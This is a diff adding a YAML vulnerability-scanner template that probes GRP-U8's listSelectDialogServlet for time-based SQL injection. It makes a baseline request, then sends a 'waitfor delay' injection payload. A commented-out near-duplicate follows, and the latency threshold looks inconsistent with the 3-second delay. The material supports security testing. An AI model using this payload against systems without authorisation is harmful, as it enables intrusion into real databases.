@@ -1,0 +1,49 @@
+name: poc-yaml-GRP-U8-sqli
+manual: true
+transport: http
+rules:
+  r0:
+    request:
+      cache: true
+      method: GET
+      path: /listSelectDialogServlet?slType=slFZX&slCdtn=1
+    expression: response.status == 200
+    output:
+      r0latency: response.latency
+  r1:
+    request:
+      cache: true
+      method: GET
+      path: /listSelectDialogServlet?slType=slFZX&slCdtn=1=2;waitfor%20delay%20%270:0:3%27
+    expression: response.latency + r0latency >= 6000
+expression: r0() && r1()
+detail:
+  author: https://github.com/via-labs
+  links:
+    - https://github.com/via-labs
+
+
+# name: poc-yaml-GRP-U8-sqli
+# manual: true
+# transport: http
+# rules:
+#   r0:
+#     request:
+#       cache: true
+#       method: GET
+#       path: /listSelectDialogServlet?slType=slFZX&slCdtn=1
+#     expression: response.status == 200
+#     output:
+#       r0latency: response.latency
+#   r1:
+#     request:
+#       cache: true
+#       method: GET
+#       path: /listSelectDialogServlet?slType=slFZX&slCdtn=1=2;waitfor%20delay%20%270:0:3%27
+#     expression: response.latency + response.r0latency >= 6000
+# expression: r0() && r1()
+# detail:
+#   author: https://github.com/via-labs
+#   links:
+#     - https://github.com/via-labs
+
